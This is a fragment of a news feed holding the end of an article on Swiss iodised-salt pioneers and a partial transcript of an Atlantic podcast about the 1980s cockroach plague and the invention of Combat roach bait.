essentially beyond dispute. Until his death in 1956, annual sales of iodised salt in Aargau, the fourth-largest canton, Bircher’s home and the centre of his power, amounted to less than 10 per cent of all salt sold there. In 1931, by which time goitre had virtually disappeared among Swiss young people, 95 per cent of the schoolchildren in Aarau still had swollen thyroids.</p><p>By the time of Bircher’s death, three decades had elapsed since the headlines of 1922. A generation had died, taking with it the memory of the way life had been. In 1927, Bruno Galli-Valerio, a member of the Goitre Commission, in a speech in Valais, railed against the ‘absurd idea, sadly so widespread, that goitre and cretinism bring shame to a country, and that they must therefore be ignored’. Yet the shame and the silence were widespread. A year later, Eggenberger noted how ‘hastily people forget past plagues’.</p><p>Eggenberger died in a climbing accident in 1946, Bayard of cancer in 1957. Hunziker outlived Switzerland’s last cretin, dying in 1982, at the age of 102. None of them could have achieved the breakthrough alone. Hunziker was a visionary, with a theory so compelling it could not be ignored; Bayard, the scientist, showed the salt would work for entire towns; Eggenberger was an activist, able to convince the cautious Swiss to embrace innovation. Yet they remain unknown, while other Swiss members of their generation are household names: Hermann Rorschach, of the inkblot test, was a colleague of Eggenberger’s in Herisau; Albert Einstein went to the same school as Eugen Bircher; Max Bircher-Benner (no relation) lives on through his muesli. Carl Jung documented the strange depression that struck his mother when the family moved to Laufen – a village that, as Heinrich Bircher’s survey shows, was badly afflicted by goitre.</p><p>In 1990, Hans Bürgi, another enterprising Swiss medic, published a paper in English on the forgotten iodine pioneers. That year, iodised salt was used in less than 20 per cent of households worldwide, and a global campaign by the WHO and Unicef was set in motion. Today, iodised salt is used by more than 88 per cent of the world’s population. Internationally, it is regarded as one of the most successful public health measures ever devised. Yet in today’s prosperous and healthy Switzerland the tale seems more fantastical than ever: an evil vanquished so completely it has been all but forgotten.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We Turned the Tide in the Roach Wars (302 pts)]]></title>
            <link>https://www.theatlantic.com/podcasts/archive/2023/11/cockroach-bait-invention-combat/676167/</link>
            <guid>38782944</guid>
            <pubDate>Wed, 27 Dec 2023 15:33:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/podcasts/archive/2023/11/cockroach-bait-invention-combat/676167/">https://www.theatlantic.com/podcasts/archive/2023/11/cockroach-bait-invention-combat/676167/</a>, See on <a href="https://news.ycombinator.com/item?id=38782944">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>Forty years ago, scientists did the impossible. Why doesn’t anyone remember?</p></div><div><figure><div data-flatplan-lead_figure_media="true"><picture><img alt="Three cockroaches playing instruments from the 1996 movie &quot;Joe's Apartment&quot;" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/F4xg4faMu5RnihdAEecLj0WuaV4=/0x0:2453x1380/750x422/media/img/mt/2023/11/MSDJOAP_EC001/original.jpg 750w, https://cdn.theatlantic.com/thumbor/2OwO1j3kgxMdn5HHLCBMH0FjcHQ=/0x0:2453x1380/828x466/media/img/mt/2023/11/MSDJOAP_EC001/original.jpg 828w, https://cdn.theatlantic.com/thumbor/aSX4apEmnX0kS_R3swLosUKv9h0=/0x0:2453x1380/960x540/media/img/mt/2023/11/MSDJOAP_EC001/original.jpg 960w, https://cdn.theatlantic.com/thumbor/PWWBs8MorLSUxgGNFXBer0n1a7E=/0x0:2453x1380/976x549/media/img/mt/2023/11/MSDJOAP_EC001/original.jpg 976w, https://cdn.theatlantic.com/thumbor/9AmsWXQGP85PbNGyQcllCXRttBM=/0x0:2453x1380/1952x1098/media/img/mt/2023/11/MSDJOAP_EC001/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/aSX4apEmnX0kS_R3swLosUKv9h0=/0x0:2453x1380/960x540/media/img/mt/2023/11/MSDJOAP_EC001/original.jpg" width="960" height="540"></picture></div><figcaption data-flatplan-lead_figure_caption="true"><span>A still from "Joe's Apartment" (1996)</span>&nbsp;(<!-- -->Warner Bros / Everett<!-- -->)</figcaption></figure></div></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><section data-event-module="article body" data-flatplan-body="true"><p data-flatplan-paragraph="true">A week before Christmas in 1983, two chemists at Yale University made a breakthrough that they thought could change the world. “It was like opening up a door and seeing a light,” one of the scientists, Stuart Schreiber, later <a data-event-element="inline link" href="https://www.nytimes.com/1984/09/26/nyregion/sexual-lure-for-roaches-synthesized.html?searchResultPosition=33">told</a> <em>The</em> <em>New York Times</em>. The pair had produced a substance, periplanone-B, that sends the male American cockroach into a thrashing, sexual frenzy.</p><p data-flatplan-paragraph="true">What if this were used to build a better trap—a cockroach honeypot that lured bugs into a dish of poison? The implications were mind-bending. Cockroaches were overrunning U.S. cities in the 1980s—more than 2 billion lived in New York alone, according to the <em>Times</em>—and there was no good way of getting rid of them. Sprayed insecticides barely worked after decades’ worth of insect evolution. “<a data-event-element="inline link" href="https://www.youtube.com/watch?v=jKhGHxO-woc">Roach Motels</a>” (glue traps, more or less) did next to nothing to prevent an infestation. My own family, like others living in apartments throughout New York City at the time, could only shrug at the roaches darting from our cupboards and crawling on the bathroom floor. I remember that my best friend’s parents had a gecko living underneath their fridge, supposedly for natural bug control. No doubt it was a fat and healthy lizard. The roaches were still legion.</p><p data-flatplan-paragraph="true">So of course scientists producing a new roach attractant in a lab made the papers. Alas, the periplanone-B solution was just another failed idea—one of many bungled forays in a never-ending war. The bugs kept on marching through our homes, as they always had; they kept on laying all their hidden eggs. Yet again, the cockroach earned its reputation as the animal that could <a data-event-element="inline link" href="https://www.semanticscholar.org/paper/Atomic-Roaches-and-Test-Tube-Babies-Siff/b5891bf11941b6d82992aac72d63506ee851525d/figure/0">never, ever be wiped out</a>.</p><p data-flatplan-paragraph="true">But even as this disappointment faded, something unbelievable was just about to happen. A true miracle in roach control was already under way. In this episode of <em>Radio Atlantic</em>, I speak with Hanna Rosin about a neglected achievement in the history of pest control.</p><p data-flatplan-paragraph="true">Listen to the conversation here:</p><p data-flatplan-paragraph="true"><em>Subscribe here: <a data-event-element="inline link" href="https://podcasts.apple.com/us/podcast/radio-atlantic/id1258635512">Apple Podcasts</a> | <a data-event-element="inline link" href="https://open.spotify.com/playlist/4PgNKjRJJWlaV6zuNr69BO">Spotify</a> | <a data-event-element="inline link" href="https://www.youtube.com/@TheAtlantic/podcasts">YouTube</a> | <a data-event-element="inline link" href="https://podcasts.google.com/feed/aHR0cHM6Ly9mZWVkcy5tZWdhcGhvbmUuZm0vcmFkaW9hdGxhbnRpYw">Google Podcasts</a> | <a data-event-element="inline link" href="https://pca.st/ccxU">Pocket Casts</a></em></p><hr><p data-flatplan-paragraph="true"><strong><em>The following is a transcript of the episode:</em></strong></p><p data-flatplan-paragraph="true"><strong>Hanna Rosin:</strong> This is <em>Radio Atlantic</em>. I’m Hanna Rosin. A few weeks ago, one of our science editors, Dan Engber, said he had a story to tell me. It’s a little weird, definitely gross. But it’s amazing. Here it is.</p><p data-flatplan-paragraph="true">[<em>Break</em>]</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Well, first close the door behind you. Hey.</p><p data-flatplan-paragraph="true"><strong>Daniel Engber:</strong> Hello.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>What’s up?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> So I have a story about a scientific discovery made in very recent times that no one thought was possible, which changed the lives of millions.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Ooh.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> But no one remembers it.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Wow. That sounds … fake? (<em>Laughs</em>.) Do you want to tell me what it is?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Sure. So this is a story of a forgotten solution, but also of a forgotten problem, and that problem is cockroaches.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Cockroach—what do you mean cockroaches are a forgotten problem? I feel like I saw one recently.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Right. You saw <em>one</em>—one cockroach. In the 1980s, there were a lot of cockroaches everywhere. Cockroaches were like a national news story and almost like a public-health emergency. So there would be articles with various levels of alarmism about how the risk of being hospitalized with childhood asthma was three times higher in kids who were exposed to cockroach infestations.</p><p data-flatplan-paragraph="true">There were stories about how cockroaches could carry the polio and yellow fever viruses.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Okay. So cockroaches everywhere. Cockroaches bad for your health.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Cockroaches everywhere. Cockroaches bad for your health.</p><p data-flatplan-paragraph="true">Cockroaches in the nation’s Capitol.</p><p data-flatplan-paragraph="true">[<em>News reel</em>]</p><div><blockquote><p><strong>Tom Brokaw:</strong> Congress certainly has its hands full these days with the deficit, the MX, Central America, and now debugging.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> So this is an <em>NBC Nightly </em>N<em>ews</em> story with Tom Brokaw from the spring of 1985, which is a very important moment in the history of cockroaches.</p><div><blockquote><p><strong>Interviewee:</strong> It’s very serious. The problem: They’re in our desks. They’re under tables. They’re everywhere.</p></blockquote></div><div><blockquote><p><strong>Journalist:</strong> Some members of Congress are trying valiantly to fight back. Congressman Al McCandless has installed this black box in his office. It exudes a sexy scent, which attracts female roaches, which are then roasted by an electric grill.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> I mean, I think just in that short clip you hear how completely helpless we were to deal with the cockroach problem. We were trying everything.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Yes, it does have a “throw spaghetti at the wall” [feel]. Like, this is the nation’s Capitol and we can’t—we don’t really have an answer, nor is anyone pretending to. It’s just like, <em>They tried this. They tried that</em>.</p><div><blockquote><p><strong>Journalist: </strong>Congressman Silvio Conte, dressed to kill today, proclaimed a war on Capitol cockroaches. A company from his home district has donated 35,000 roach traps to the Capitol. But Conte said more help than that is needed.</p></blockquote></div><div><blockquote><p><strong>Silvio Conte: </strong>And I want to appeal to the president of the United States. I am certain that President Reagan wants to get rid of as many troublesome cockroaches who are running around the halls of Congress as possible. So please join me in this war and squash one for the Gipper!</p></blockquote></div><p data-flatplan-paragraph="true">[<em>Music</em>]</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> But, you know, listening to all this kind of has an almost, like, a dreamy quality for me because I actually lived through this myself. Like, I was a child of the cockroach ’80s. I had cockroaches in my house all over the place too, and it’s almost, like, hard to remember how pervasive they were.</p><p data-flatplan-paragraph="true">[<em>Music</em>]</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> So I grew up in New York City.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Where?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> In Morningside Heights.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> In an apartment?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> In an apartment.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Okay.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> So, middle-class families in the 1980s in New York City had a lot of cockroaches, as I can say from personal experience—just a number of cockroaches that I think is unimaginable to younger people, to my younger colleagues here at <em>The Atlantic.</em></p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Against my—really, like, every fiber of my being, I’m going to say, “Paint me a picture.” (<em>Laughs</em>.)</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>They’d be all over the place all the time, like, in full view, in day, in night. Um, certainly if you went into the kitchen at night and turned on the light, they would scatter. It wouldn’t be like you’d see individual insects; you’d see, like, a wave pattern.</p><p data-flatplan-paragraph="true">You and your brother, let’s say, might be taking the Cheerios out of the cabinet. And open it up, and pour it into the bowl, and cockroaches would come out with the Cheerios, which I think sounds really terrifying to today’s New Yorker. But at the time it was just, like, <em>Time to get a new box of Cheerios</em>.</p><p data-flatplan-paragraph="true">There’s really this feeling that it was, like, a natural phenomenon—like an endless sense of being enveloped in roaches. Like, it was an atmosphere of roaches or an ocean.</p><p data-flatplan-paragraph="true">You’re speechless.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Just to weigh in, I do 100 percent relate. I grew up in an apartment in Queens, and exactly your memory. The only difference is that it was cornflakes and not Cheerios, but they were everywhere.</p><p data-flatplan-paragraph="true">Although, you know what’s weird? I can’t seem to remember if they freaked me out or not. Like, did they freak you out? Did you scream when you saw cockroaches or call for your mommy? What did you do?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>So, I don’t think we were that squeamish about them. In fact, I know we weren’t squeamish, because the other thing I remember vividly was my brother and I would play with the cockroaches. We would use our wooden blocks and build, like, obstacle courses, sort of, and try to do cockroach Olympics.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Did you actually touch them with your fingers?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> I mean, it’s kind of hard to imagine that I didn’t, but it must be the case. I mean, like I said, there’s sort of a dreamy quality to all this, where I almost doubt my own memories. And so just to do a kind of a gut check, I wanted to call my brother.</p><div><blockquote><p><strong>Daniel Engber:</strong> First of all, did we have cockroaches in our apartment growing up?</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> We had a lot of cockroaches in our apartment growing up, and I, being a little bit older than you, remember it extremely clearly. But it still seems somewhat fantastical, the prevalence of cockroaches in our life.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> Okay, so first I asked him about the cereal.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Okay.</p><div><blockquote><p><strong>Ben Engber:</strong> I loved Rice Krispies. And they used to have, like, a slightly over-toasted Rice Krispie that was, like, a darker brown.</p></blockquote></div><div><blockquote><p><strong>Daniel Engber:</strong> Yeah, the occasional brown one.</p></blockquote></div><div><blockquote><p><strong>Ben Engber: </strong>The brown one. And I definitely remember a lot of arguments about whether something was an over-toasted Rice Krispie—a small over-toasted Rice Krispie—or a roach doody. And we would frequently have these arguments.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin:</strong> (<em>Laughs</em>.) He’s, like, completely chill about the roach-doody-for-breakfast situation.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>If only it was just the Rice Krispies, Hanna.</p><div><blockquote><p><strong>Ben Engber:</strong> We had the special medicine cups. They were sort of, like, plastic, hollow spoons.</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> And I remember one time, Mom poured whatever it was, probably Dimetapp or something like that, in and I saw something swimming in it.</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> I was like, <em>There’s a roach in there. I swear there’s a roach in there</em>. And then she held it up to the light, and there was nothing in there. I didn’t want to take it. Finally she convinced me. I drank the whole thing.</p></blockquote></div><div><blockquote><p>I felt the roach crawling around all over my mouth.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Oh, God!</p><div><blockquote><p><strong>Ben Engber:</strong> And I spit it all into the sink. And, uh, she said, <em>Oh, there was a roach in it</em>.</p></blockquote></div><div><blockquote><p>Roaches were just everywhere in our lives. So if we were constantly, like, throwing out something just cause a few roaches walked over it, we wouldn’t have anything.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> So that’s how we lived, but here’s the important part from that conversation with Ben.</p><div><blockquote><p><strong>Daniel Engber:</strong> Do you remember if that was in apartment 44? I forget when we moved from apartment 44 to apartment 43.</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> That was after. No, that was after it was solved, because we moved when I was 12 or 13, and it was, it was done by then.</p></blockquote></div><div><blockquote><p><strong>Daniel Engber:</strong> Um, when you said that by that time the cockroach problem was solved, what’s your, what’s your memory of the solving of the problem in our home?</p></blockquote></div><div><blockquote><p><strong>Ben Engber:</strong> Very simple: uh, Combat.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> So, remember when I told you that the problem we forgot was roaches? This is the solution we forgot: Combat.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Wait, you mean the Combat roach trap? Like, that little plastic disc where the roaches go in and then they die or something? Like, that’s what this is about?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yes. That is the amazing American invention that we have all forgotten.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> The thing that sits in aisle 13 on the top shelf, that’s the amazing invention?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> The thing that should be sitting in a museum.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> (<em>Laughs</em>.)</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> The people who invented Combat are American heroes. They did something—I mean, you have to think about the fact that the cockroach was and is a symbol of indestructibility, right? This is the animal that’s going to outlive us after a nuclear war.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Uh-huh.</p><p data-flatplan-paragraph="true">Engber: This is an—if you’ve ever seen <em>WALL</em>-<em>E</em>, it’s a postapocalyptic Earth. All that’s left is a robot and a cockroach.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Uh-huh.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> It’s the animal that cannot be killed. And then in the 1980s, we did it. I think it’s fair to say that it solved the problem, and I don’t mean solved it completely and eliminated cockroaches forever, but really took a huge problem and made it much smaller. And that wasn’t just true in my apartment, but across the country. In fact, I found evidence that that is exactly what happened.</p><p data-flatplan-paragraph="true">And so, I just was fascinated by the question of, <em>Who did that?</em>, and what it means that we don’t even really fully remember that it happened.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Wait. There’s a who? Like, there’s a person who did that?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yeah. Let me introduce you to a very important figure in the history of cockroaches.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Mm-hmm.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Who has a catchphrase, and his catchphrase is “Always bet on the roach.”</p><p data-flatplan-paragraph="true">He’s, um, a member of the pest-management hall of fame.</p><p data-flatplan-paragraph="true">Are you familiar with Pi Chi Omega, the fraternal organization dedicated to furthering the science of pest control?</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Uh-huh.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> They have an annual scholarship called the Dr. Austin Frishman Scholarship.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Ah. Wait, are we gonna hear from Austin Frishman himself?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Dr. Cockroach.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Wow. Okay.</p><div><blockquote><p><strong>Daniel Engber: </strong>Hi. Dr. Frishman?</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> And so, I got him on the line, and he turns out to be sort of, like, a cockroach mystic almost.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> What is that?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Just, any question you ask, you might get an answer like this.</p><div><blockquote><p><strong>Frishman:</strong> I want you to picture a landfill, and it’s snowing. It’s about 28 degrees out, okay? And you’re there with seven or eight men, and you’re digging away at the snow because you’re teaching them how to bait on a landfill. Alright?</p></blockquote></div><div><blockquote><p><strong>Frishman:</strong> And then out of the snow in that cold comes American roaches running up, bubbling up—five, 10, 15, 60, 100, 200 from the smoldering heat down below.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin:</strong> I love this man. He makes it seem, like, biblical. So where does this cockroach mystic, Dr. Frishman, fit into this story?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> You know, Frishman is in the story almost from the very start. In 1985, and in the lead up to 1985, Frishman had been hired by a company called American Cyanamid. And American Cyanamid researchers had this product that they were selling for use in controlling fire ants.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Mm-hmm.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> And the researchers in their, you know, industrial-products division were aware of the fact that this fire ant poison worked on cockroaches. And, in fact, they used it in the lab to control cockroaches.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Their own cockroach problem?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Yes. Yeah, they put it in peanut butter, and they put it around the lab, just so they could continue to do their work on fire ants.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Mm-hmm.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Um, but then the company was, you know, making this effort to try to figure out, W<em>ell, can we repurpose some of our industrial products for a consumer use?</em> And so forth. So, you’ve got a hot, new roach-control product. Who do you call?</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Oh!</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Austin Frishman.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Yes. Austin Frishman.</p><div><blockquote><p><strong>Frishman:</strong> And I said, “Well, it’s going to be difficult, and it may not work.” And they said to me, “Listen. Do you want to do the project or not?” I said, “No. I’ll do it just so you know what we’re up against.”</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> Okay, so everything we had up until that point were these, you know, these insecticides that we’d just been using for years. And the roaches had just developed resistance to them. Even if you, you know, you killed 99 percent of them, the ones you didn’t kill would have some mutation that protected them or they’d have a thicker shell or something, a thicker exoskeleton, and they’d survive and reproduce. And now your insecticides weren’t working anymore.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Right. So they would just keep outsmarting us?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Right. And so one of the things about this new product that made it different from the old ones was it wasn’t just a spray that you’d put in the corners. It’s actually a bait. That little, black disc had something in it that sort of tasted like oatmeal cookie that roaches loved, and they would come in and get it and then take it out.</p><div><blockquote><p><strong>Philip Koehler:</strong> We were filming the cockroaches, and we found that only 25 percent of the cockroaches ate the bait, but 100 percent of the cockroaches would die.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> That’s Philip Koehler. He’s another cockroach expert. And what he’s talking about here is the fact that, like, this stuff would kill roaches that hadn’t even eaten it.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Like, what do you mean? How?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Well, that’s what I asked Phil Koehler.</p><div><blockquote><p><strong>Koehler:</strong> It was a slow-acting toxicant that allowed transfer to other members of the colony.</p></blockquote></div><div><blockquote><p><strong>Engber:</strong> Wait. They would regurgitate it? Or how does it get transferred?</p></blockquote></div><div><blockquote><p><strong>Koehler:</strong> Well, there are several mechanisms of transfer. The main one would be that cockroaches will eat another cockroach’s poop. It was actually after this work with Combat baits that it became, uh, known that cockroaches actually feed poop to their young.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Amazing. I love it when researchers are put in a position where they have to say words like <em>poop</em>, but just very seriously. (<em>Laughs</em>.)</p><div><blockquote><p><strong>Koehler:</strong> And there are actually other methods of transfer of toxicant as well. There is, like you said, regurgitation, where they get sick and they regurgitate some, and other cockroaches will come and feed on that vomit. Uh, there’s also cannibalism, where a cockroach will attack another cockroach and eat it. And there’s also, uh, necrophagy, where the cockroaches will eat the dead.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Each method more charming than the next. (<em>Laughs</em>.)</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yeah.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Yeah. Okay.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Vomit, poop, or cannibalism.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> This seems exciting.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> (<em>Laughs</em>.)</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> No, I mean, if I were them, this would be really exciting. Like, I’m just imagining them, you know, like in <em>Oppenheimer</em>, sort of sitting in their lab, like, figuring out every element of this. <em>How are we gonna make it safe?</em> <em>How’s it gonna work?</em> It’s exciting.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>Yeah, they were on the verge of something big.</p><div><blockquote><p><strong>Frishman: </strong>We would run to the lab early in the morning to see the results from the night before, or stay up half the night and watch. And we began to see, you know, what was happening. In the beginning, I was hesitant and the whole thing. But as we began to do the work and I saw the results first in the lab, it was a breakthrough. Okay?</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber: </strong>Frishman was among the first to take this breakthrough product, put it in a syringe, take it out of the lab, and start using it in restaurants and diners to see if it worked.</p><div><blockquote><p><strong>Frishman:</strong> I went into a small diner, a little luncheonette place, and a bunch of guys were sitting and eating sandwiches, and I was behind the counter, so I was down low. And I had the bait, and I saw the roaches in a crack, and I just put a little dab. And as I went to go do it, the roaches started coming out, and they were gobbling it up.</p></blockquote></div><div><blockquote><p><strong>Engber:</strong> You, uh, saw in real time them come to the bait.</p></blockquote></div><div><blockquote><p><strong>Frishman:</strong> I was the first person in the world. I was shaking, okay? I’m telling you, I was shaking. I still have that syringe, that original one.</p></blockquote></div><p data-flatplan-paragraph="true">[<em>Music</em>]</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>This is the moment. This is the brink of the relatively roach-free world that we live in today. Now we had the little black discs, I would say, you know, two inches across or something.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>With an entrance and an exit.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> With an entrance. With an entrance and an exit.</p><div><blockquote><p><strong>Frishman:</strong> I had written a book called <em>The Cockroach Combat Manual</em>, so that’s how it got its name.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> And Frishman is going to take this product on the road.</p><div><blockquote><p><strong>Frishman: </strong>People would write in with horror stories, and they won a prize: the product and me. And we would go into those places and knock out the population.</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> So, he takes this to Texas. He takes it to Georgia. They do an event at the Museum of Natural History in New York City. They go to the Capitol. Remember the Tom Brokaw report? Those are Combat traps. And then ads start appearing on television.</p><div><blockquote><p>[<em>Compilation of Combat advertisements</em>]</p></blockquote></div><p data-flatplan-paragraph="true"><strong>Engber:</strong> So this wasn’t just a marketing campaign. I mean, the product really did work.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>What do you mean, it worked?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Well, cockroach numbers were going down—you can find signs everywhere. Actually, a guy I went to high school with wrote an article for T<em>he New York Times</em> in 2004, and he reported that there had been a survey of federal buildings and their cockroach complaints between 1988 and 1999—so this is Combat rollout era—and the number of complaints fell by 93 percent.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Wow.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> I also found a 1991 story from T<em>he New York Times</em>—again, right in that Combat zone—and a New York City housing official is quoted as saying, “There was a time when people were horrified at roaches running rampant, and now everybody keeps saying, ‘Where did they go to?’”</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>So it’s a thing. It’s, like, an actual, documented thing.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Yeah.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> And yet it’s not a huge moment? Like, there aren’t a lot of stories saying, <em>Yay, us. </em>W<em>e have conquered the cockroach problem</em>?</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>No, there are not. There are stories about Combat success as almost like a business case study.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Mm-hmm.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> There are stories that remark upon the fact that there are fewer cockroaches than there used to be.</p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Mm-hmm.</p><p data-flatplan-paragraph="true">But nothing that’s like, T<em>his enormous, giant, urban problem has finally been solved by this ragtag crew of amazing scientists</em>.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> (<em>Laughs</em>.) Nothing of that nature.</p><p data-flatplan-paragraph="true">There’s a reason why I had to introduce Austin Frishman to you as a member of the pest-management hall of fame. And you weren’t like, <em>Oh, you mean the guy on the back of the quarter?</em></p><p data-flatplan-paragraph="true"><strong>Rosin: </strong>Yeah. (<em>Laughs</em>.) Right. But why?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> I mean, that is the question that has been keeping me up at night. And I have some ideas.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Dan, you said you had some ideas about why this discovery didn’t get the credit and hoopla that it deserved.</p><p data-flatplan-paragraph="true"><strong>Engber: </strong>So my brother had a good theory about this. I said, <em>How come just our family—why didn’t we celebrate and go to dinner or something? The roaches are gone.</em> He said, W<em>ell, it’s because we just assumed they would come back</em>.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Hmm.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> So I think that must be part of it, right? That there was like, <em>Oh, this new thing works</em>. B<em>ut yeah, everything works the first time you do it</em>.</p><p data-flatplan-paragraph="true">So there was never one moment where you realized that the world had changed.</p><p data-flatplan-paragraph="true">Or it could be that, you know, when things change for better, we just have a tendency to just accept the new, better reality and pretend the old thing didn’t happen. <em>Hey, that’s done. I’d rather not discuss it</em>.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Like, what’s an example of that?</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> The Spanish flu, for example. There’s a famous gap in art and literature about the Spanish flu. There’s not a great literature of this cataclysmic event in the 19-teens. You’d think there would be, but there isn’t. Why not?</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Probably because it was traumatic. And actually, you know, I think that’s similar to the experience with cockroaches. When, at least in my memory, when I was living with them, it wasn’t just, like, gross or annoying or an inconvenience. It’s really unsettling. Like, it lives as this constant undercurrent of anxiety and a sense that you just don’t have control over things. It’s like a terrible feeling.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Like a free-floating, pervasive anxiety hanging over you at all times.</p><p data-flatplan-paragraph="true"><strong>Rosin:</strong> Yes. Yes.</p><p data-flatplan-paragraph="true"><strong>Engber:</strong> Can we talk about the Cold War for a second?</p><p data-flatplan-paragraph="true"><strong>Rosin: 